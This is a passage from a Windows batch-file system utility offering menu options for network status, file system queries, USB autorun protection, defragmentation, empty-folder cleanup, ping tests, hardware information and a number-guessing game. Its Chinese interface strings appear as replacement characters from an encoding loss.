tasklist /fi "pid eq !jclj!" /m
ver
%hx%
%pause%
endlocal
goto 23
:23.3
title ��ʾTCP/UDP����!system!
cls
netstat -aon
%hx%
set �ַ���=
set /p "�ַ���=����Ҫ���ҵ��ַ���(e=����)(f=ˢ��): "
call :var �ַ���
if not defined �ַ��� (goto 23.3)
if "!�ַ���!" equ "f" (goto 23.3)
if /i "!�ַ���!" equ "e" (endlocal&goto 23)
cls
netstat -aon|findstr /i /c:"!�ַ���!"
%hx%
%pause%
endlocal
goto 23
:23.4
color 0f
set ysbak=97;40m
title ѭ����ʾCPUռ�����������ٶ�!system!
cls
echo;���ڻ�ȡ������Ϣ...
for /f "tokens=2 delims==" %%a in ('"2>nul Wmic path Win32_PerfFormattedData_Tcpip_NetworkInterface get name /value"') do (
	set "netcard=%%a"
	set "netcard=!netcard:~0,-1!"
)
for /f "tokens=2 delims==" %%a in ('"2>nul wmic cpu get numberOflogicalprocessors /value"') do (
	set "corenum=%%a"
	set "corenum=!corenum:~0,-1!"
	set /a "tghs=corenum*2+4+2"
)
for /f "tokens=2 delims==" %%a in ('"2>nul wmic cpu get name /value"') do (
	set "cpu=%%a"
	set "cpu=!cpu:~0,-1!"
)
cls
:23.4.1
set xh=
for /f "tokens=2 delims==" %%a in ('"2>nul Wmic path Win32_PerfFormattedData_Tcpip_NetworkInterface get BytesReceivedPersec,BytesSentPersec /value"') do (
	set /a "xh+=1"
	if "!xh!" equ "1" (
		set "downspeed=%%a"
		set "downspeed=!downspeed:~0,-1!"
	)
	if "!xh!" equ "2" (
		set "upspeed=%%a"
		set "upspeed=!upspeed:~0,-1!"
		for /f "skip=%tghs% tokens=2 delims==" %%a in ('"2>nul Wmic Path Win32_PerfFormattedData_PerfOS_Processor Get PercentIdleTime /value"') do (
			set "bfb=%%a"
			set "bfb=!bfb:~0,-1!"
			set /a "lyl=100-bfb"
		)
	)
)
call :xdwjs !upspeed! b upspeed
call :xdwjs !downspeed! b downspeed
echo;!netcard!
echo;
echo;�ϴ��ٶ�:	!upspeed!/s	�����ٶ�:	!downspeed!/s
echo;
echo;!cpu!
echo;
<nul set /p "=CPU����������: "
if !lyl! leq 25 (
	call :rgb 12.12.12 0.255.0 !lyl!
) else (
	if !lyl! leq 50 (
		call :rgb 12.12.12 255.255.0 !lyl!
	) else (
		if !lyl! leq 75 (
			call :rgb 12.12.12 255.127.0 !lyl!
		) else (
			call :rgb 12.12.12 255.0.0 !lyl!
		)
	)
)
<nul set /p "=%%"
echo;
%hx%
echo;��e���ز˵�
<nul set /p "=!cswz!s!cswz!0;0H"
>nul choice /c 1e /t 1 /d 1
if "!errorlevel!" equ "1" (goto 23.4.1)
endlocal
goto 23
:24
setlocal
title �ļ�ϵͳ��Ϣ��ѯ!system!
cls
%hx%
for %%a in (
	"[1]�г�����������"
	"[2]��ѯһ��������������"
	"[3]��ѯ����Ϣ"
	"[4]��ѯNTFS����Ϣ"
	"[5]��ѯREFS����Ϣ"
	"[6]��ѯ������Ϣ"
	"[0]���ز˵�"
) do (
	echo;%%~a
)
%hx%
set cho=1234560
%sel% shuru
if "!shuru!" equ "1" (goto 24.1)
if "!shuru!" equ "2" (goto 24.2)
if "!shuru!" equ "3" (goto 24.3)
if "!shuru!" equ "4" (goto 24.4)
if "!shuru!" equ "5" (goto 24.5)
if "!shuru!" equ "6" (goto 24.6)
if "!shuru!" equ "7" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
<nul set /p=��������ȷ��ѡ�
call :out 2
endlocal
goto 24
:24.1
titel �г�����������!system!
cls
call :sypf sypf
echo;!sypf!
%hx%
%pause%
endlocal
goto 24
:24.2
title ��ѯһ��������������!system!
cls
%hx%
call :sypf sypf
echo;!sypf!
%hx%
set qdqlx=
set /p "qdqlx=����Ҫ��ѯ��������: "
call :var qdqlx
if not defined qdqlx (goto 24.2)
cls
fsutil fsinfo drivetype !qdqlx!:
%hx%
%pause%
endlocal
goto 24
:24.3
title ��ѯ����Ϣ!system!
cls
%hx%
call :sypf sypf
echo;!sypf!
%hx%
set qdqlx=
set /p "qdqlx=����Ҫ��ѯ��������: "
call :var qdqlx
if not defined qdqlx (goto 24.3)
cls
fsutil fsinfo volumeinfo !qdqlx!:
%hx%
%pause%
endlocal
goto 24
:24.4
title ��ѯNTFS����Ϣ!system!
cls
%hx%
call :sypf sypf
echo;!sypf!
%hx%
set qdqlx=
set /p "qdqlx=����Ҫ��ѯ��������: "
call :var qdqlx
if not defined qdqlx (goto 24.4)
cls
fsutil fsinfo ntfsinfo !qdqlx!:
%hx%
%pause%
endlocal
goto 24
:24.5
title ��ѯREFS����Ϣ!system!
cls
%hx%
call :sypf sypf
echo;!sypf!
%hx%
set qdqlx=
set /p "qdqlx=����Ҫ��ѯ��������: "
call :var qdqlx
if not defined qdqlx (goto 24.5)
cls
fsutil fsinfo refsinfo !qdqlx!:
%hx%
%pause%
endlocal
goto 24
:24.6
title ��ѯ������Ϣ!system!
cls
%hx%
call :sypf sypf
echo;!sypf!
%hx%
set qdqlx=
set /p "qdqlx=����Ҫ��ѯ��������: "
call :var qdqlx
if not defined qdqlx (goto 24.6)
cls
fsutil fsinfo sectorinfo !qdqlx!:
%hx%
%pause%
endlocal
goto 24
:25
setlocal
title ����ָ����С���ļ�!system!
cls
set cjlj=
set /p "cjlj=�����ļ�·��(e=����): "
call :var cjlj
if not defined cjlj (endlocal&goto 25)
if /i "!cjlj!" equ "e" (endlocal&goto memuv2)
set cjdx=
set /p "cjdx=�����ļ���С(��λ:�ֽ�)(e=����): "
call :var cjdx
if not defined cjdx (endlocal&goto 25)
if /i "!cjdx!" equ "e" (endlocal&goto memuv2)
call :checkvar cjdx num&&(endlocal&goto 25)
fsutil file createnew !cjlj! !cjdx!
%hx%
%pause%
endlocal
goto memuv2
:26
setlocal
title ����U�̲���!system!
cls
echo;�˹������U�̽������ߣ�����autorun���͵Ĳ����Զ�����
%hx%
for %%a in (
	"[1]����U������"
	"[2]ȡ��U������"
	"[0]���ز˵�"
) do (
	echo;%%~a
)
%hx%
set cho=120
%sel% shuru
if "!shuru!" equ "1" (goto 26.1)
if "!shuru!" equ "2" (goto 26.2)
if "!shuru!" equ "3" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
<nul set /p "=��������ȷ��ѡ�"
call :out 2
endlocal
goto 26
:26.1
title ����U������!system!
cls
echo;�����������ƶ�����...
call :sypf sypf
for %%a in (!sypf!) do (
	for /f "tokens=2 delims=- " %%b in ('fsutil fsinfo drivetype %%a') do (
		if "%%b" equ "���ƶ�������" (
			if exist "%%aautorun.inf" (
				call :isntfs %%a||call :wjqx "%%aautorun.inf"
				call :isrefs %%a||call :wjqx "%%aautorun.inf"
				attrib -s -h -r "%%aautorun.inf"
			)
			call :md "%%aautorun.inf"
			md "%%aautorun.inf\�����ļ��У�����ɾ��"
			md "%%aautorun.inf\�����ļ��У�����ɾ�� / "
			echo;y|cacls "%%aautorun.inf" /t /c /p everyone:r
		)
	)
)
%hx%
echo;U���������
%pause%
endlocal
goto 26
:26.2
title ȡ��U������!system!
cls
echo;�����������ƶ�����...
call :sypf sypf
for %%a in (!sypf!) do (
	for /f "tokens=2 delims=- " %%b in ('fsutil fsinfo drivetype %%a') do (
		if "%%b" equ "���ƶ�������" (
			if exist "%%aautorun.inf" (
				call :isntfs %%a||call :wjqx "%%aautorun.inf"
				call :isrefs %%a||call :wjqx "%%aautorun.inf"
				attrib -s -h -r "%%aautorun.inf"
			)
			>nul 2>nul del /f /q "%%aautorun.inf"
			>nul 2>nul rd /s /q "%%aautorun.inf"
		)
	)
)
%hx%
echo;ȡ��U���������
%pause%
endlocal
goto 26
:27
setlocal
title ������Ƭ����!system!
cls
%hx%
echo;[1]�������д���
echo;[0]���ز˵�
%hx%
call :sypf sypf
echo;!sypf!
%hx%
set fenxi=
set /p "fenxi=������Ҫ�������̷�:"
call :var fenxi
if "!fenxi!" equ "1" (goto 27.1)
if "!fenxi!" equ "0" (endlocal&goto memuv2)
cls
defrag /a !fenxi!:
%hx%
:27.3
set zhengli=
set /p "zhengli=�Ƿ�ʼ������Ƭ����(y/n):"
call :var zhengli
if /i "!zhengli!" equ "y" (goto 27.2)
if /i "!zhengli!" equ "n" (endlocal&goto 27)
<nul set /p "=��������ȷ��ѡ�"
call :out 2
goto 27.3
:27.1
cls
call :sypf sypf
if /i "!system:~11,2!" equ "XP" (
	for %%a in (!sypf!) do (defrag /v /x %%a)
) else (
	for %%a in (!sypf!) do (defrag /u /v /x %%a)
)
%hx%
%pause%
endlocal
goto 27
:27.2
cls
defrag /u /v /x !fenxi!:||defrag /v /x !fenxi!:
%hx%
%pause%
endlocal
goto 27
:28
setlocal
title һ��ɾ�����ļ���!system!
cls
echo;ע��:�����ϵͳ�̽��в������ܻᱻɱ���������
%hx%
call :sypf sypf
echo;!sypf!
%hx%
set caozuo=
set /p "caozuo=������Ҫ�������̷���·��: "
if not defined caozuo (
	endlocal
	goto 28
)
call :strlen caozuo jg
if "!jg!" equ "1" (
	set "caozuo=!caozuo!:\"
) else (
	call :ljjc caozuo dir&&(
		<nul set /p "=·�� "!caozuo!" ����һ���ļ���"
		call :out 2
		endlocal
		goto 28
	)
)
cls
echo;���Everything�İ�װ·��������״̬...
for /f "skip=2 tokens=3" %%a in ('"2>nul reg query "HKEY_LOCAL_MACHINE\SOFTWARE\voidtools\Everything" /v InstallLocation"') do (
	if exist "%%a\Everything.exe" (
		for /f "tokens=1 delims=," %%b in ('tasklist /fi "status eq running" /fi "username eq "%username%"" /fi "imagename eq everything.exe" /fo csv /nh') do (
			if /i "%%~b" equ "everything.exe" (
				if exist "%%a\es.exe" (
					set "EverythingInstallPath=%%a"
					cls
					echo;ʹ��Everything�������ļ���...
					goto loop1
				)
			)
		)
	)
)
cls
echo;ʹ��dir�����������ļ���...
goto loop2
:loop1
set empty=0
set "gth=^!"
>"!temp!\empty_dir.txt" "!EverythingInstallPath!\es.exe" "!caozuo!" empty: !gth!attrib:l
for /f "usebackq delims=" %%a in ("!temp!\empty_dir.txt") do (
	rd /q "%%a"&&(
		set empty=1
		echo;��ɾ�����ļ��� "%%a"
	)
)
call :out 2
if "!empty!" equ "1" (goto loop1)
del /f /q "!temp!\empty_dir.txt"
goto 28.1
:loop2
for /f "delims=" %%a in ('"dir /ad-l /s /b "!caozuo!"|sort /r"') do (
	2>nul rd /q "%%a"&&echo;��ɾ�����ļ��� "%%a"
)
:28.1
%hx%
echo;���ļ���ɾ�����
%pause%
endlocal
goto memuv2
:29
setlocal
title ping���������ӳ�!system!
cls
if exist "!windir!\system32\curl.exe" (
	>nul ping /n 1 www.baidu.com
	if not errorlevel 1 (
		rem <nul set /p "=����IPV4��ַ: ""
		rem curl https://4.ipw.cn
		rem curl https://ipv4.ip.sb
		curl --connect-timeout 2 --max-time 10 "https://myip.ipip.net"
		<nul set /p "="
		echo;
	)
	>nul ping /n 1 240c::6666
	if not errorlevel 1 (
		<nul set /p "=����IPV6��ַ: "
		curl --connect-timeout 2 --max-time 10 "https://6.ipw.cn"
		rem curl https://ipv6.ip.sb
		echo;
	)
)
echo;
set ping=
set pingcishu=
set /p "ping=����Ŀ��IP������ַ: "
set /p "pingcishu=����ping����: "
call :var ping
call :var pingcishu
echo;
echo;���ڲ���!ping!�������ӳ�...
ping /n !pingcishu! !ping! /a
%hx%
%pause%
endlocal
goto memuv2
:30
setlocal
title Ӳ�����!system!
cls
for /f "tokens=2 delims==" %%a in ('"2>nul Wmic OS Get LastBootUpTime /value"') do (
	set "systemstarttime=%%a"
	echo;ϵͳ����ʱ��:	!systemstarttime:~0,4!��!systemstarttime:~4,2!��!systemstarttime:~6,2!�� !systemstarttime:~8,2!:!systemstarttime:~10,2!:!systemstarttime:~12,2!
	echo;
)
for /f "tokens=2 delims==" %%a in ('"2>nul Wmic OS Get InstallDate /value"') do (
	set "systeminstalltime=%%a"
	echo;ϵͳ��װ����:	!systeminstalltime:~0,4!��!systeminstalltime:~4,2!��!systeminstalltime:~6,2!�� !systeminstalltime:~8,2!:!systeminstalltime:~10,2!:!systeminstalltime:~12,2!
	echo;
)
set cs=
for /f "tokens=2 delims==" %%a in ('"2>nul wmic cpu get name /value"') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			<nul set /p "=CPU:"
			echo;		!var:~0,-1!
		) else (
			echo;			!var:~0,-1!
		)
	)
)
echo;
for /f "tokens=2 delims==" %%a in ('"2>nul wmic cpu get numberofcores /value"') do (
	for /f "tokens=2 delims==" %%b in ('"2>nul wmic cpu get numberOflogicalprocessors /value"') do (
		set "var1=%%a"
		set "var2=%%b"
		echo;		!var1:~0,-1!���� !var2:~0,-1!�߳�
		echo;
	)
)
set cs=
for /f "tokens=2 delims==" %%a in ('"2>nul wmic cpu get processorid /value"') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			<nul set /p "=CPUID:"
			echo;		!var:~0,-1!
		) else (
			echo;			!var:~0,-1!
		)
	)
)
echo;
set ch=
for /f "tokens=2 delims==" %%a in ('"2>nul wmic path win32_cachememory get maxcachesize /value"') do (
	set /a "ch+=1"
	set dw=0
	if "!ch!" equ "1" (
		call :xdwjs %%a kb dw
		echo;һ������:	!dw!
		echo;
	) else (
		if "!ch!" equ "2" (
			call :xdwjs %%a kb dw
			echo;��������:	!dw!
			echo;
		) else (
			if "!ch!" equ "3" (
				call :xdwjs %%a kb dw
				echo;��������:	!dw!
				echo;
			) else (
				if "!ch!" equ "4" (
					call :xdwjs %%a kb dw
					echo;�ļ�����:	!dw!
					echo;
				)
			)
		)
	)
)
set cs=
for /f "tokens=2 delims==" %%a in ('"2>nul wmic cpu get currentclockspeed /value"') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			<nul set /p "=CPU��Ƶ:"
			echo;	!var:~0,-1! MHz
		) else (
			echo;		!var:~0,-1! MHz
		)
	)
)
echo;
for /f "tokens=2 delims==" %%a in ('"2>nul wmic cpu get datawidth /value"') do (
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		echo;����λ��: 	!var:~0,-1! bit
		echo;
	)
)
for /f "tokens=2 delims==" %%a in ('"2>nul wmic cpu get extclock /value"') do (
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		echo;��Ƶ: 		!var:~0,-1! MHz
	)
)
%hx%
for /f "tokens=2 delims==" %%a in ('"2>nul wmic baseboard get manufacturer /value"') do (
	set "var=%%a"
	echo;����������:	!var:~0,-1!
	echo;
)
for /f "tokens=2 delims==" %%a in ('"2>nul wmic baseboard get product /value"') do (
	set "var=%%a"
	echo;�����ͺ�:	!var:~0,-1!
	echo;
)
for /f "tokens=2 delims==" %%a in ('"2>nul Wmic Csproduct Get Uuid /value"') do (
	set "var=%%a"
	echo;����UUID:	!var:~0,-1!
	echo;
)
for /f "tokens=2 delims==" %%a in ('"2>nul wmic bios get manufacturer /value"') do (
	set "var=%%a"
	echo;BIOS������:	!var:~0,-1!
	echo;
)
for /f "tokens=2 delims==" %%a in ('"2>nul wmic bios get smbiosbiosversion /value"') do (
	set "var=%%a"
	echo;BIOS�汾:	!var:~0,-1!
	echo;
)
for /f "tokens=2 delims==" %%a in ('"2>nul wmic bios get releasedate /value"') do (
	set "bioszzrq=%%a"
	echo;BIOS��������: 	!bioszzrq:~0,4!��!bioszzrq:~4,2!��!bioszzrq:~6,2!��
)
%hx%
set cs=
for /f "tokens=2 delims==" %%a in ('"2>nul wmic desktopmonitor get name /value"') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			<nul set /p "=��ʾ���ͺ�:"
			echo;	!var:~0,-1!
		) else (
			echo;		!var:~0,-1!
		)
	)
)
echo;
set cs=
for /f "tokens=2 delims==" %%a in ('"2>nul wmic desktopmonitor get monitormanufacturer /value"') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			<nul set /p "=��ʾ��������:"
			echo;	!var:~0,-1!
		) else (
			echo;		!var:~0,-1!
		)
	)
)
echo;
set cs=
for /f "tokens=2 delims==" %%a in ('"2>nul wmic path win32_videocontroller get currenthorizontalresolution /value"') do (
	for /f "tokens=2 delims==" %%b in ('"2>nul wmic path win32_videocontroller get currentverticalresolution /value"') do (
		set /a "cs+=1"
		set "var1=%%a"
		set "var2=%%b"
		if "!cs!" equ "1" (
			<nul set /p "=�ֱ���:"
			echo;		!var1:~0,-1! x !var2:~0,-1!
		) else (
			echo;			!var1:~0,-1! x !var2:~0,-1!
		)
	)
)
%hx%
set cs=
for /f "tokens=2 delims==" %%a in ('"2>nul wmic path win32_videocontroller get name /value"') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			<nul set /p "=�Կ�:"
			echo;		!var:~0,-1!
		) else (
			echo;			!var:~0,-1!
		)
	)
)
echo;
set cs=
for /f "tokens=2 delims==" %%a in ('"2>nul wmic path win32_videocontroller get adapterram /value"') do (
	set /a "cs+=1"
	set dw=0
	if "!cs!" equ "1" (
		call :xdwjs %%a b dw
		<nul set /p "=�Դ�����:"
		echo;	!dw!
	) else (
		call :xdwjs %%a b dw
		echo;		!dw!
	)
)
echo;
for /f "tokens=2 delims==" %%a in ('"2>nul wmic path win32_videocontroller get videomodedescription /value"') do (
	set "var=%%a"
	echo;��ǰ��ʾģʽ: 	!var:~0,-1!
	echo;
)
for /f "tokens=2 delims==" %%a in ('"2>nul wmic path win32_videocontroller get currentrefreshrate /value"') do (
	set "var=%%a"
	echo;��ǰˢ����: 	!var:~0,-1! Hz
	echo;
)
for /f "tokens=2 delims==" %%a in ('"2>nul wmic path win32_videocontroller get driverdate /value"') do (
	set "qdrq=%%a"
	echo;��������: 	!qdrq:~0,4!��!qdrq:~4,2!��!qdrq:~6,2!��
	echo;
)
for /f "tokens=2 delims==" %%a in ('"2>nul wmic path win32_videocontroller get driverversion /value"') do (
	set "var=%%a"
	echo;�����汾: 	!var:~0,-1!
)
%hx%
set cs=
for /f "tokens=2 delims==" %%a in ('"2>nul wmic diskdrive get model /value"') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			<nul set /p "=Ӳ���ͺ�:"
			echo;	!var:~0,-1!
		) else (
			echo;		!var:~0,-1!
		)
	)
)
echo;
set cs=0
for /f "delims=" %%a in ('"2>nul wmic diskdrive get interfacetype,size,totalsectors,partitions,firmwarerevision /value"') do (
	set "var=%%a"
	set "var=!var:~0,-1!"
	if defined var (
		if "!cs!" equ "0" (echo;�̼��汾	�ӿ�����	Ӳ������	��������	������)
		set /a "cs+=1"
		>nul 2>nul set "!var!"
		if "!cs!" equ "5" (
			call :xdwjs !size! b size
			call :strlen firmwarerevision cd
			if !cd! lss 8 (
				set "dsp=!firmwarerevision!		"
			) else (
				set "dsp=!firmwarerevision!	"
			)
			call :strlen interfacetype cd
			if !cd! lss 8 (
				set "dsp=!dsp!!interfacetype!		"
			) else (
				set "dsp=!dsp!!interfacetype!	"
			)
			call :strlen size cd
			if !cd! lss 8 (
				set "dsp=!dsp!!size!		"
			) else (
				set "dsp=!dsp!!size!	"
			)
			call :strlen totalsectors cd
			if !cd! lss 8 (
				set "dsp=!dsp!!totalsectors!		"
			) else (
				set "dsp=!dsp!!totalsectors!	"
			)
			call :strlen partitions cd
			if !cd! lss 8 (
				set "dsp=!dsp!!partitions!"
			) else (
				set "dsp=!dsp!!partitions!"
			)
			echo;!dsp!
			set cs=
		)
	)
)
call :sypf sypf
echo;!sypf!
echo;
for /f "delims=" %%a in ('"2>nul wmic logicaldisk get name,volumename,description,filesystem,size,freespace"') do (
	set "var=%%a"
	if "!var:~0,-1!" neq "" (echo;!var:~0,-1!)
)
%hx%
set cs=
for /f "tokens=2 delims==" %%a in ('"2>nul Wmic Printer where Default='TRUE' get caption /value"') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			<nul set /p "=��ӡ��������:"
			echo;	!var:~0,-1!
		) else (
			echo;		!var:~0,-1!
		)
	)
)
echo;
set cs=
for /f "tokens=2 delims==" %%a in ('"2>nul Wmic Printer where Default='TRUE' get drivername /value"') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			<nul set /p "=��ӡ���ͺ�:"
			echo;	!var:~0,-1!
		) else (
			echo;		!var:~0,-1!
		)
	)
)
echo;
set cs=
for /f "tokens=2 delims==" %%a in ('"2>nul wmic sounddev get name /value"') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			<nul set /p "=����:"
			echo;		!var:~0,-1!
		) else (
			echo;		!var:~0,-1!
		)
	)
)
echo;
set cs=
for /f "tokens=2 delims=]" %%a in ('"2>nul Wmic Path Win32_NetworkAdapterConfiguration WHERE IPEnabled='TRUE' get caption /value"') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			<nul set /p "=����:"
			echo;		!var:~1,-1!
		) else (
			echo;		!var:~1,-1!
		)
	)
)
echo;
set cs=
for /f "tokens=2 delims==" %%a in ('"2>nul Wmic path Win32_PerfFormattedData_Tcpip_NetworkInterface get CurrentBandwidth /value"') do (
	set /a "cs+=1"
	set netspeed=
	set "netspeed=%%a"
	set "netspeed=!netspeed:~0,-1!"
	set /a "netspeed/=1000000"
	if "!cs!" equ "1" (
		<nul set /p "=���������ٶ�:"
		echo;	!netspeed! Mbps
		echo;
	) else (
		echo;		!netspeed! Mbps
		echo;
	)
)
set cs=
for /f "tokens=2 delims==" %%a in ('"2>nul Wmic Path Win32_NetworkAdapterConfiguration WHERE IPEnabled='TRUE' get defaultipgateway /value"') do (
	set mrwg=
	set "mrwg=%%a"
	set "mrwg=!mrwg:{=!"
	set "mrwg=!mrwg:}=!"
	set "mrwg=!mrwg:"=!"
	set "mrwg=!mrwg:~0,-1!"
	for %%a in (!mrwg!) do (
		set /a "cs+=1"
		if "!cs!" equ "1" (
			<nul set /p "=���ص�ַ:"
			echo;	%%a
		) else (
			echo;		%%a
		)
	)
)
echo;
if exist "!windir!\system32\curl.exe" (
	>nul ping /n 1 www.baidu.com
	if not errorlevel 1 (
		for /f "delims=" %%a in ('curl -s --connect-timeout 2 --max-time 10 "https://4.ipw.cn"') do (
			<nul set /p "=�ⲿIP��ַ:"
			echo;	%%a
			echo;
		)
	)
)
set cs=
for /f "tokens=2 delims==" %%a in ('"2>nul Wmic Path Win32_NetworkAdapterConfiguration WHERE IPEnabled='TRUE' get ipaddress /value"') do (
	set ipdz=
	set "ipdz=%%a"
	set "ipdz=!ipdz:{=!"
	set "ipdz=!ipdz:}=!"
	set "ipdz=!ipdz:"=!"
	set "ipdz=!ipdz:~0,-1!"
	for %%a in (!ipdz!) do (
		set /a "cs+=1"
		if "!cs!" equ "1" (
			<nul set /p "=IP��ַ:"
			echo;		%%a
		) else (
			echo;		%%a
		)
	)
)
echo;
set cs=
for /f "tokens=2 delims==" %%a in ('"2>nul Wmic Path Win32_NetworkAdapterConfiguration WHERE IPEnabled='TRUE' get macaddress /value"') do (
	set /a "cs+=1"
	set maxdz=
	set "macdz=%%a"
	set "macdz=!macdz:{=!"
	set "macdz=!macdz:}=!"
	set "macdz=!macdz:"=!"
	set "macdz=!macdz:~0,-1!"
	if "!cs!" equ "1" (
		if defined macdz (
			<nul set /p "=����MAC��ַ:"
			echo;	!macdz!
		)
	) else (
		if defined macdz (echo;		!macdz!)
	)
)
%hx%
set cs=
for /f "tokens=2 delims==" %%a in ('"2>nul wmic memorychip get capacity /value"') do (
	set /a "cs+=1"
	set dw=0
	if "!cs!" equ "1" (
		<nul set /p "=�ڴ�����:"
		call :xdwjs %%a b dw
		echo;	!dw!
	) else (
		call :xdwjs %%a b dw
		if "!dw!" neq "0" (echo;		!dw!)
	)
)
set cs=
for /f "tokens=2 delims==" %%a in ('"2>nul wmic memorychip get speed /value"') do (
	set /a "cs+=1"
	set "var=%%a"
	if "!var:~0,-1!" neq "" (
		if "!cs!" equ "1" (
			<nul set /p "=�ڴ�Ƶ��:"
			echo;	!var:~0,-1! MHz
		) else (
			echo;		!var:~0,-1! MHz
		)
	)
)
if exist "!windir!\system32\systeminfo.exe" (systeminfo|find "�ڴ�")
%hx%
mode
%hx%
%pause%
endlocal
goto memuv2
:31
setlocal
title ������!system!
cls
echo;��һ������0��С��128����(������128)
%hx%
cls
set num=0
set var=
:d0c
for /l %%a in (1,2,127) do (set "var=!var!%%a ")
set cs=0
set line=
for %%a in (!var!) do (
	set /a "cs+=1"
	if !cs! lss 10 (
		set "line=!line!%%a	"
	) else (
		echo;!line!%%a
		set line=
		set cs=0
	)
)
if defined line (echo;!line!)
choice /c YN /n /m ���������������?(Y=��,N=û��)[1\7]
if "!errorlevel!" equ "1" (set num=1)
set a=2
set b=3
cls
set var=
:d1c
for /l %%a in (!a!,1,!b!) do (
	set "var=!var!%%a "
	set /a "a+=2"
	set /a "b+=2"
)
if !b! lss 128 (goto d1c)
set cs=0
set line=
for %%a in (!var!) do (
	set /a "cs+=1"
	if !cs! lss 10 (
		set "line=!line!%%a	"
	) else (
		echo;!line!%%a
		set line=
		set cs=0
	)
)
if defined line (echo;!line!)
choice /c YN /n /m ���������������?(Y=��,N=û��)[2\7]
if "!errorlevel!" equ "1" (set /a "num+=2")
set c=4
set d=7
cls
set var=
:d2c
for /l %%a in (!c!,1,!d!) do (
	set "var=!var!%%a "
	set /a "c+=2"
	set /a "d+=2"
)
if !d! lss 128 (goto d2c)
set cs=0
set line=
for %%a in (!var!) do (
	set /a "cs+=1"
	if !cs! lss 10 (
		set "line=!line!%%a	"
	) else (
		echo;!line!%%a
		set line=
		set cs=0
	)
)
if defined line (echo;!line!)
choice /c YN /n /m ���������������?(Y=��,N=û��)[3\7]
if "!errorlevel!" equ "1" (set /a "num+=4")
set e=8
set f=15
cls
set var=
:d3c
for /l %%a in (!e!,1,!f!) do (
	set "var=!var!%%a "
	set /a "e+=2"
	set /a "f+=2"
)
if !f! lss 128 (goto d3c)
set cs=0
set line=
for %%a in (!var!) do (
	set /a "cs+=1"
	if !cs! lss 10 (
		set "line=!line!%%a	"
	) else (
		echo;!line!%%a
		set line=
		set cs=0
	)
)
if defined line (echo;!line!)
choice /c YN /n /m ���������������?(Y=��,N=û��)[4\7]
if "!errorlevel!" equ "1" (set /a "num+=8")
set g=16
set h=31
cls
set var=
:d4c
for /l %%a in (!g!,1,!h!) do (
	set "var=!var!%%a "
	set /a "g+=2"
	set /a "h+=2"
)
if !g! lss 128 (goto d4c)
set cs=0
set line=
for %%a in (!var!) do (
	set /a "cs+=1"
	if !cs! lss 10 (
		set "line=!line!%%a	"
	) else (
		echo;!line!%%a
		set line=
		set cs=0
	)
)
if defined line (echo;!line!)
choice /c YN /n /m ���������������?(Y=��,N=û��)[5\7]
if "!errorlevel!" equ "1" (set /a "num+=16")
set i=32
set j=63
cls
set var=
:d5c
for /l %%a in (!i!,1,!j!) do (
	set "var=!var!%%a "
	set /a "i+=2"
	set /a "j+=2"
)
if !j! lss 128 (goto d5c)
set cs=0
set line=
for %%a in (!var!) do (
	set /a "cs+=1"
	if !cs! lss 10 (
		set "line=!line!%%a	"
	) else (
		echo;!line!%%a
		set line=
		set cs=0
	)
)
if defined line (echo;!line!)
choice /c YN /n /m ���������������?(Y=��,N=û��)[6\7]
if "!errorlevel!" equ "1" (set /a "num+=32")
set k=64
set l=127
cls
set var=
:d6c
for /l %%a in (!k!,1,!l!) do (
	set "var=!var!%%a "
	set /a "k+=2"
	set /a "l+=2"
)
if !l! lss 128 (goto d6c)
set cs=0
set line=
for %%a in (!var!) do (
	set /a "cs+=1"
	if !cs! lss 10 (
		set "line=!line!%%a	"
	) else (
		echo;!line!%%a
		set line=
		set cs=0
	)
)
if defined line (echo;!line!)
choice /c YN /n /m ���������������?(Y=��,N=û��)[7\7]
if "!errorlevel!" equ "1" (set /a "num+=64")
cls
if "!winv!" equ "0" (
	echo;�������Ը��ӵļ����,�ó������������Ǹ�����: !cswz!41;92m!num!!cswz!!ysbak!
) else (
	echo;�������Ը��ӵļ����,�ó������������Ǹ�����: !num!
)
%hx%
%pause%
endlocal
goto memuv2
:32
setlocal
title DOS����!system!
cls
%hx%
for %%a in (
	"[1]��ʱ����ָ������"
	"[2]��ʱ����ָ���ļ�"
	"[3]��ʾ���еļƻ�����"
	"[4]ɾ���ƻ�����"
	"[0]���ز˵�"
) do (
	echo;%%~a
)
%hx%
set cho=12340
%sel% shuru
if "!shuru!" equ "1" (goto 32.1)
if "!shuru!" equ "2" (goto 32.2)
if "!shuru!" equ "3" (goto 32.3)
if "!shuru!" equ "4" (goto 32.4)
if "!shuru!" equ "5" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
<nul set /p "=��������ȷ��ѡ�"
call :out 2
endlocal
goto 32
:32.1
title ��ʱ����ָ������!system!
cls
set txnrmc=
set /p "txnrmc=ָ����������: "
call :var txnrmc
%hx%
set txnr=
set /p "txnr=��������Ҫ���ѵ�����: "
call :var txnr
%hx%
set txnrrq=
set /p "txnrrq=������������(��ʽ: yyyy/mm/dd ����2015/08/05): "
call :var txnrrq
%hx%
set txnrsj=
set /p "txnrsj=��������ʱ��(��ʽ: hh:mm:ss ����09:03:05): "
call :var txnrsj
cls
